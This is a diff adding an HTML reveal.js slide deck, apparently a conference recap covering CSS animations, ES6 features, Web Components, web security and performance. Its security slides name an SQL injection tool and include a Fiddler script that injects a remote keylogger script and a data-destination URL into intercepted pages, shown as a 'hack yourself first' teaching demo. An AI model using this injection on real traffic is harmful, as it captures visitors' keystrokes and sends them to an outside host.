@@ -1,0 +1,849 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+
+  <title>Web Development Group - Web Directions + JS Summit</title>
+
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <link rel="stylesheet" href="css/reveal.min.css">
+  <link rel="stylesheet" href="css/theme/default.css" id="theme">
+  <link rel="stylesheet" href="css/screen.css">
+
+  <!-- For syntax highlighting -->
+  <link rel="stylesheet" href="lib/css/zenburn.css">
+
+  <!-- If the query includes 'print-pdf', use the PDF print sheet -->
+  <script>
+    document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+  </script>
+
+        <!--[if lt IE 9]>
+        <script src="lib/js/html5shiv.js"></script>
+        <![endif]-->
+      </head>
+
+      <body>
+
+        <div class="reveal">
+
+          <!-- Any section element inside of this container is displayed as a slide -->
+          <div class="slides">
+            <section id="intro">
+              <h1>
+                What I learned from...                
+              </h1>                   
+              <img src="img/web-directions-logo.jpg">
+              <img src="img/js-summit-2013.png"> 
+
+              <p>
+                <small>Alaeddin Nassani</small>
+              </p>
+            </section>
+    <section id="css">
+    
+    <section>      
+      <img src="http://w3widgets.com/responsive-slider/img/css3.png">
+    </section>  
+  
+    <section>
+    <h2>Why transitions</h2>
+    
+
+    <img src="https://d262ilb51hltx0.cloudfront.net/max/800/0*ugnsxwIKHdkMHEe1.gif"/>
+
+    <img src="https://d262ilb51hltx0.cloudfront.net/max/800/0*k09FdcfO2JI1jcbq.gif"/>
+    </section>
+
+    <section>
+    <h2>CSS Transitions</h2>
+      <pre><code>        
+#elementId{
+  transition-property: box-shadow;
+  transition-duration: 1s;
+  transition-timing-function: linear;
+  transition-delay: 2s;
+}
+      </code></pre>
+
+      Or
+      <pre><code>
+transition: box-shadow 1s linear 2s;        
+      </code></pre>
+
+      </section>
+      <section>
+      
+      <h3>Animatable properties</h3>
+
+      <code>
+      
+      <table>
+        <tr>
+          <td><img src="img/tick.png" class="icon"></td>
+          <td>max-height, box-shadow, max-width, etc...</td>
+        </tr>
+        <tr>
+          <td><img src="img/cross.png" class="icon"></td>
+          <td>underline, display, float, etc...</td>
+        </tr>
+      </table>
+
+      
+      </code>
+
+      <p>
+        <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_animated_properties">List of animated properties</a>      
+      </p>
+      
+      </section>
+
+
+      <section>
+        <h2>timing function</h2>
+<p>
+  <code>  
+  linear|ease|ease-in|ease-in-out|ease-out
+</code>
+</p>
+
+<p data-height="268" data-theme-id="4498" data-slug-hash="Bqljv" data-default-tab="result" class='codepen'>See the Pen <a href='http://codepen.io/an83/pen/Bqljv'>Bqljv</a> by Alaeddin Nassani (<a href='http://codepen.io/an83'>@an83</a>) on <a href='http://codepen.io'>CodePen</a>.</p>
+<script async src="//codepen.io/assets/embed/ei.js"></script>
+
+<p></p>
+<p>
+  
+</p>
+
+      </section>
+
+      <section>
+        <h2>Fancy timing function</h2>
+
+        <ul>
+          <li><a href="http://cubic-bezier.com/">Cubic Bezier </a></li>
+          <li><a href="http://easings.net/">easings.net</a></li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Animations &amp; <code>@keyframes</code></h2>
+
+        <pre><code>
+@keyframes NAME-YOUR-ANIMATION {
+  0% { font-size: 10px; }
+  30% { font-size: 15px; }
+  100% { font-size: 12px; }
+}          
+
+#elementID {
+  animation-name: NAME-YOUR-ANIMATION;
+  animation-duration: 10s;
+  ...  
+}
+        </code></pre>
+
+<!-- 
+  animation-timing-function: ease;
+  animation-iteration-count: 1; /* infinite */
+  animation-direction: normal; /* normal, alternate */
+  animation-delay: 5s;
+  animation-play-state: running; /* running, paused */
+  animation-fill-mode: forwards; /* forwards, backwards, both, none*/
+ -->
+        <p data-height="268" data-theme-id="4498" data-slug-hash="eJaGq" data-default-tab="result" class='codepen'>See the Pen <a href='http://codepen.io/an83/pen/eJaGq'>eJaGq</a> by Alaeddin Nassani (<a href='http://codepen.io/an83'>@an83</a>) on <a href='http://codepen.io'>CodePen</a>.</p>
+<script async src="//codepen.io/assets/embed/ei.js"></script>
+      </section>
+<!-- 
+      <section>
+      <h2>Example</h2>
+      <pre><code>
+.accordion{
+  height: auto;
+}
+
+.accordion.collapsed{
+  height: 0;
+}
+
+element.classList.toggle("collapsed");
+      </code></pre>
+
+      </section>
+      <section>
+      <h2>Not all properties can be transitioned</h2>
+      <table>
+        <tr>
+          <td></td>
+        </tr>
+      </table>
+
+
+      <pre><code>        
+.accordion{
+  height: auto;
+  max-height: 10em;
+  transition: max-height, 0.5s;
+}
+
+.accordion.collapsed{
+  max-height: 0;
+}
+      </code></pre>
+
+      <pre><code>
+li:nth-child(2){
+  transition-delay: .3s;
+}
+
+li:nth-child(3){
+  transition-delay: .5s;
+}        
+      </code></pre>
+
+ -->
+    
+
+<!--     <section>
+      <h2>Vendor compatibility</h2>
+      <pre><code>
+#elementId {
+  -webkit-transition: all 1s ease-in-out;
+  -moz-transition: all 1s ease-in-out;
+  -o-transition: all 1s ease-in-out;
+  transition: all 1s ease-in-out;
+}        
+      </code></pre>
+    </section>   
+ -->
+    <section>
+      <h2>pre-defined animations</h2>
+      <ul>
+        <li><a href="http://daneden.github.io/animate.css/">animate.css</a></li>
+        <li><a href="http://www.justinaguilar.com/animations/#">CSS3 Animation Cheat Sheet</a></li>
+      </ul>
+    </section>
+
+<!--     <section>
+      <h2>parallex scrolling</h2>
+
+    </section> -->
+  
+    <section>
+      <h2>Shapes</h2>
+
+      <p data-height="268" data-theme-id="4498" data-slug-hash="KJisf" data-default-tab="result" class='codepen'>See the Pen <a href='http://codepen.io/adobe/pen/KJisf'>CSS Shapes: Ellipse</a> by Adobe Web Platform (<a href='http://codepen.io/adobe'>@adobe</a>) on <a href='http://codepen.io'>CodePen</a>.</p>
+      <script async src="//codepen.io/assets/embed/ei.js"></script>
+    </section>
+
+     <section>
+      <h2>Regions</h2>
+
+      <img src="http://html.adobe.com/_/img/slide_cssregions.png">
+    <ul>
+      <li><code>flow-into</code></li>
+      <li><code>flow-from</code></li>      
+    </ul>
+
+    <div>
+      <!--<img src="http://blogs.adobe.com/webplatform/files/2012/09/1374005692.png">  
+
+       <p><a href="http://html.adobe.com/webplatform/layout/regions/">Regions</a></p>
+      <p><a href="http://codepen.io/collection/jabto/">Demo</a></p>  -->
+    </div>
+    </section> 
+
+    <section>
+      <h2>Polygons</h2>
+
+      <ul>
+        <li><code>shape-inside</code></li>
+        <li><code>shape-outside</code></li>      
+      </ul>
+      <p data-height="500" data-theme-id="4498" data-slug-hash="ighcw" data-default-tab="result" class='codepen'>See the Pen <a href='http://codepen.io/adobe/pen/ighcw'>Polygon Dawn</a> by Adobe Web Platform (<a href='http://codepen.io/adobe'>@adobe</a>) on <a href='http://codepen.io'>CodePen</a>.</p>
+      <script async src="//codepen.io/assets/embed/ei.js"></script>
+
+      <!-- <p><a href="http://html.adobe.com/webplatform/layout/shapes/">Shapes</a></p> -->
+      
+    </section>    
+
+    <section>
+      <h2>Summary</h2>
+
+      <ul>
+        <li>Animations bring life to your website</li>
+        <li>CSS3 shapes and regions make content cool</li>
+      </ul>
+    </section>
+  
+
+    </section> 
+
+            <section id="es6">
+            <section>
+              <img src="http://i.stack.imgur.com/Mmww2.png">
+            </section>  
+    
+            <section>
+                <h2>ECMAscript 6 Main features</h2>
+                <ul>
+                  <li>Block-scoped variables</li>
+                  <li>deconstructing</li>
+                  <li>classes</li>
+                  <li>modules</li>                        
+                  <li>template</li>
+                  <li>library</li>
+                  <li>for-of loop</li>
+                </ul>
+                <br/><br/>
+
+              </section>
+
+              <section>
+                <h2>Block-scoped variables (var vs. let)</h2>
+                <pre><code data-trim>
+function order(){
+  if (x > y) {
+    var temp = x;
+    x = y;
+    y = temp;
+  }
+  console.log(temp === x);    //true
+  return [x, y];
+}
+              </code></pre>
+              
+              <pre><code data-trim>
+function order(){
+  if (x > y) {
+    let temp = x;
+    x = y;
+    y = temp;
+  }
+  console.log(temp === x);    //ReferenceError: tmp is not defined
+  return [x, y];
+}
+              </code></pre>
+    </section>
+
+    <section>
+      <h2>Deconstructing</h2>
+      <div class="fragment roll-in">
+      <h3>Objects</h3>
+      <pre><code data-trim>
+let obj = { first: 'Jane', last: 'Doe' };
+let { first: f , last: l } = obj;
+console.log(f + ' ' + l); // Jane Doe
+      </code></pre>
+      </div>
+      
+
+      <div class="fragment roll-in">
+        <h3>Arrays</h3>
+            <pre><code data-trim>
+let [x, y] = [ 'a', 'b' ];  // x='a', y='b'
+
+let [x, y, ...rest] = [ 'a', 'b', 'c', 'd' ];  // x='a', y='b', rest = [ 'c', 'd' ]
+
+[x,y] = [y,x]; // swap values
+            </code></pre>
+      </div>
+      
+    </section>
+
+    <section>
+      <h2>Arrow functions</h2>
+      <pre><code data-trim>
+let squares = [1, 2, 3].map(function (x) {return x * x});
+
+let squares = [1, 2, 3].map(x => x * x);
+      </code></pre>
+    </section>
+
+    <section>
+      <h2>lexical this</h2>
+      <pre><code data-trim>
+//ES5
+function Person() {
+  this.age = 0;
+
+  var that = this;
+
+  setInterval(function growUp() {    
+    that.age++;
+  }, 1000);
+}
+      </code></pre>
+
+      <pre class="fragment roll-in"><code data-trim>
+//ES6
+function Person(){
+  this.age = 0;
+
+  setInterval(() => {
+    this.age++; 
+  }, 1000);
+}
+      </code></pre>
+    </section>
+
+
+    <section>
+      <h2>...</h2>
+      <h3>rest parameters</h3>
+      <pre><code data-trim>
+function func2(arg0, ...others) {
+  return others;
+} 
+
+> func2(0, 1, 2, 3)
+[1, 2, 3]
+> func2(0)
+[]
+> func2()
+[]
+      </code></pre>
+
+
+      <div class="fragment roll-in">
+        <h3>spread parameters</h3>
+        <pre><code data-trim>
+> Math.max(7, 4, 11)
+11
+> Math.max(...[7, 4, 11])
+11          
+        </code></pre>
+      </div>
+    </section>
+
+    <section>
+      <h2>classes</h2>
+
+      <pre><code data-trim>
+//ES5
+function Point(x, y) {
+  this.x = x;
+  this.y = y;
+}
+Point.prototype.toString = function () {
+  return '('+this.x+', '+this.y+')';
+};        
+      </code></pre>
+
+
+      <pre class="fragment roll-in"><code data-trim>
+//ES6
+class Point {
+  constructor(x, y) {
+    this.x = x;
+    this.y = y;
+  }
+  toString() {
+    return '('+this.x+', '+this.y+')';
+  }
+}     
+      </code></pre>
+    </section>
+
+    <section>
+      <h2>Inheritance</h2>
+      <pre><code data-trim>
+//ES5
+function ColorPoint(x, y, color) {
+  Point.call(this, x, y);
+  this.color = color;
+}
+
+ColorPoint.prototype = Object.create(Point.prototype);
+ColorPoint.prototype.constructor = ColorPoint;
+ColorPoint.prototype.toString = function () {
+  return this.color+' '+Point.prototype.toString.call(this);
+}        
+      </code></pre>
+
+      <pre class="fragment roll-in"><code data-trim>
+//ES6      
+class ColorPoint extends Point {
+  constructor(x, y, color) {
+    super(x, y); // same as super.constructor(x, y)
+    this.color = color;
+  }
+  toString() {
+    return this.color+' '+super();
+  }
+}      
+      </code></pre> 
+    </section>
+
+    <section>
+      <h2>modules</h2>
+
+      <pre><code data-trim class="javascript">
+// lib/math.js
+let notExported = 'abc';
+export function square(x) {
+  return x * x;
+}
+export const MY_CONSTANT = 123;
+      </code></pre>
+
+      <pre class="fragment roll-in"><code class="javascript">
+// main.js
+import {square} from 'lib/math';
+console.log(square(3));
+      </code></pre>
+      <pre class="fragment roll-in"><code class="javascript">
+// or
+import 'lib/math' as math;
+console.log(math.square(3));
+
+      </code></pre>
+    </section>
+    
+    <section>
+      <h2>Can I use it?</h2>
+
+      <ul>
+        <li> <a href="http://www.typescriptlang.org/">Typescript</a></li>
+        <li> <a href="https://github.com/google/traceur-compiler">Traceur</a></li>
+      </ul>
+    </section>
+
+    </section>
+
+    <section id="html">
+      <section>        
+        <h2>Web Components</h2>
+        <img src="https://2.gravatar.com/avatar/cedf2a3fe1ccf53aa00f50dda79cedf3?d=https%3A%2F%2Fidenticons.github.com%2F67a927cc484bc1c5bbba3e0cb3112f7e.png&r=x&s=400">
+      </section>
+
+      <section>
+        
+
+<p>To add a widget...</p>
+<pre><code data-trim>
+<link rel="stylesheet" type="text/css" href="my-widget.css">
+<script src="my-widget.js"></script>  
+
+<div data-my-widget></div>
+
+$(function() {
+  $('[data-my-widget]').myWidget();
+});  
+</code></pre>
+
+<div class="fragment roll-in">
+  <p>What if...</p>  
+  <pre><code data-trim>
+<link rel="import" href="my-widget.html">
+
+<my-widget></my-widget>
+  </code></pre>
+
+  <pre><code>
+<my-widget>
+  #document-fragment
+    <div>
+      <input type="text" />
+      <button>Go</button>
+    </div>
+</my-widget>    
+  </code></pre>
+</div>
+
+      </section>
+
+      <section>
+        <h2>Web Components Umbrella</h2>
+        <ul>
+          <li>Custom Elements</li>
+          <li>Shadow DOM</li>
+          <li>Template Element</li>
+          <li>HTML Import</li>
+          <li>CSS Decorators</li>
+        </ul>
+
+      </section>
+
+      <section>
+      <h2><code>input type="date"</code></h2>
+
+        <input type="date">
+      </section>
+
+      <section>
+
+      <h2>How to..</h2>
+
+        <pre><code data-trim>
+document.register('my-element', {
+  prototype: Object.create(HTMLElement.prototype, {
+    createdCallback: {
+      value: function() {
+        
+        var shadow = this.createShadowRoot();
+        shadow.innerHTML = 'Hello <em part="world">World</em>';
+      }
+    }
+})});
+
+</code></pre>
+
+<pre class="fragment roll-in"><code data-trim>
+<my-element></my-element>  
+
+</code></pre>
+
+
+<pre class="fragment roll-in"><code data-trim>
+my-element::part(world) {
+  color: green;
+}  
+</code></pre>
+
+</code></pre>
+
+      </section>
+
+      <section>
+        <h2>Advantages</h2>
+
+        <ul>
+          <li>Simple</li>
+          <li>Consistent</li>
+          <li>Reusable</li>
+          <li>Encapsulated</li>
+          <li>Composable</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Can I use...?</h2>
+
+        <ul>
+          <li><a href="http://www.polymer-project.org/">Polymer</a></li>
+          <li><a href="http://www.x-tags.org/">x-tags</a></li>
+        </ul>
+      </section>
+
+    </section>
+
+
+
+    <section id="security">
+      <section>
+        <h2>Hack yourself first</h2>
+        <img src="http://icons.iconarchive.com/icons/studiomx/web/256/Earth-Security-icon.png">
+
+        <p>
+          <a href="http://hackyourselffirst.troyhunt.com/">http://hackyourselffirst.troyhunt.com/</a>        
+        </p>
+        
+      </section>
+      
+      <section>
+        <h2>SQL Injection</h2>
+        <p>...using <a href="http://itsecteam.com/products/havij-advanced-sql-injection/">havij</a></p>
+
+        <img src="img/sql-injection.png">
+      </section>
+      <section>
+        <h2>Script Injection attack</h2>
+        <p>...using <a href="http://www.telerik.com/fiddler">Fiddler</a></p>
+
+        <pre><code>
+if (oSession.oResponse.headers.ExistsAndContains("Content-Type","text/html")){
+    oSession.utilDecodeResponse();
+    oSession.utilReplaceInResponse('</body>',
+        '<script type="text/javascript" src="http://hackyourselffirst.troyhunt.com/scripts/keylogger.js" ></script> <script type="text/javascript"> destination = "http://hackyoursefl.troyhunt.com/Keylogger/?k=;"</script> </body>');    
+}          
+        </code></pre>
+
+        <img class="fragment roll-in" src="img/script-injection.PNG">
+      </section>
+      
+      <section>
+        <h2>Summary</h2>
+
+        <ul>
+          <li>Avoid database terms in URL</li>
+          <li>Protect transport layer (HTTPS)</li>
+        </ul>
+      </section>
+      
+    </section>
+
+    <section id="performance">
+      
+      <section>
+        <h1>Smooth as native</h1>  
+        <img src="http://www.kinvey.com/blog/images/2013/07/html5-phone.jpg">
+      </section>
+     
+      <section>
+        <h2>3 metrics</h2>
+        <ul>
+          <li>16ms to render</li>
+          <li>100ms for any delay</li>
+          <li>Match expectation</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Network</h2>        
+
+        <ul>
+          <li>
+            async
+            <!-- <ul>
+              <li>batching</li>
+              <li>HTTP 2.0</li>
+              <li>W3C Beacon API</li>
+            </ul> -->
+          </li>          
+          <li >
+            images
+            <!-- <ul>
+              <li>70-95%</li>
+              <li>responsive</li>
+              <li>high res for hig DPI screens</li>
+            </ul> -->
+          </li>
+          <li >
+            3rd party scripts
+            <!-- <ul>
+              <li>
+                <a href="http://www.webpagetest.org/">
+                  http://www.webpagetest.org/
+                </a>    
+              </li>
+              <li>
+                <a href="http://jsmanners.com/">
+                  http://jsmanners.com/
+                </a>    
+              </li>
+            </ul> -->
+          </li>
+          <li >
+            prefetch
+            <!-- <div>
+              <pre><code class="xml JavaScript html" data-trim>
+<link rel='dns-prefetch' href='hostname-to-resolve.com'>
+<link rel='subresource' href='/path/to/some/script.js'>
+<link rel='prefetch' href='/most/likely/next/page.html'>    
+<link rel='prerender' href='/overwhelmingly/likely/next/page.html'>
+              </code></pre>
+            </div> -->
+          </li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>rendering</h2>
+
+        <ul>
+          <li>
+            Tools
+            <ul>
+              <li>Timeline</li>
+              <li>Chrome tracing</li>
+              <li>FPS meter</li>
+            </ul>        
+          </li>
+          <!-- <li>layout boundary</li>
+          <li>Interleaved reads/writes</li>
+          <li>Image decoding</li> -->
+          <li>
+            Hadrware accelerated transforms
+            <ul>
+              <code><li>translate() vs. left:</li></code>              
+            </ul>
+          </li>
+        </ul>
+        
+      </section>
+
+      <section>
+        <h2>storing data</h2>
+
+        <p>Cookies, localStorage, IndexedDB, AppCache, Files API</p>
+
+        <img class="fragment roll-in" src="http://triblondon.github.io/talk-html5perf/content/storage-perf.png"> 
+        
+      </section>
+
+      <section>
+        <h2>text encoding</h2>
+
+          <img class="fragment roll-in" src="http://triblondon.github.io/talk-html5perf/content/idb-unicode.jpg"> 
+
+      </section>
+
+      <section>
+        <h2>click delay</h2>
+        
+        <ul>
+          <li>
+            <a href="http://github.com/ftlabs/fastclick">fastclick</a>
+            (<a href="http://triblondon.github.io/talk-html5perf/#/60/1">simulation</a>)
+          </li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>perception</h2>
+
+        <img src="http://triblondon.github.io/talk-html5perf/content/economist-progbars.png">
+      </section>
+
+    </section>
+
+    <section>
+      <h1>Thank you :)</h1>
+
+      <p><a href="http://bit.ly/jade-web-dev">http://bit.ly/jade-web-dev</a></p>
+    </section>
+
+  </div>
+</div>
+
+<script src="lib/js/head.min.js"></script>
+<script src="js/reveal.min.js"></script>
+
+<script>
+
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+  controls: true,
+  progress: true,
+  history: true,
+  center: true,
+
+    theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+    transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+    // Parallax scrolling
+    // parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+    // parallaxBackgroundSize: '2100px 900px',
+
+    // Optional libraries used to extend on reveal.js
+    dependencies: [
+      { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+      { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+      { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+      { src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+      { src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+    ]
+});
+
+</script>
+
+</body>
+</html>
